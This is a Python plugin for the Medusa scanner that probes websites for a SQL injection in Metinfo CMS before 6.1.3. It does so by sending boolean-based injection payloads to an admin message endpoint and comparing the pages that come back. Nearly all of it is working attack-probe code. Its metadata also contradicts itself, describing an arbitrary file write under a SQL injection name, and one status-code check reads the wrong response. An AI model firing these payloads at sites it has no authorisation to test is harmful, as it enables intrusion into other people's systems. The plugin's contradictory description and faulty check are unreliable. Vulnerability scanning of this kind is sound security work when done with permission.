#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/11 16:39 PM'
import urllib.parse
import requests
import ClassCongregation


class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-12-24"  # 插件编辑时间
        self.info['disclosure']='2019-3-21'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "MetinfoSQLInjectionVulnerability"  # 插件名称
        self.info['name'] ='MetinfoSQL注入漏洞' #漏洞名称
        self.info['affects'] = "Metinfo"  # 漏洞组件
        self.info['desc_content'] = "位于app/system/include/class/web.class.php468行开始的web类的析构函数中存在任意文件写入"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的版本"  # 修复建议
        self.info['version'] = "6.1.3之前版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果




def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "42%20and%201=2"
        payload2="42%20and%201=1"
        payload_url = scheme + "://" + url +":"+ str(port) +"/admin/index.php?n=message&m=web&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id="+ payload
        payload_url2 = scheme + "://" + url + ":" + str(
            port) + "/admin/index.php?n=message&m=web&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=" + payload2
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }

        resp = requests.get(payload_url, headers=headers, timeout=6,proxies=proxies,  verify=False)
        resp2 = requests.get(payload_url2, headers=headers, timeout=6, proxies=proxies,verify=False)
        con = resp.text
        con2 = resp2.text
        code = resp.status_code
        code2 = resp.status_code
        if code== 200 and code2== 200 and con.find('反馈已经被关闭') != -1 and con2.find('验证码错误') != -1 and con!=con2:
            Medusa = "{}存在SQL注入漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}\r\n{}".format(url,payload_url,con,con2)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类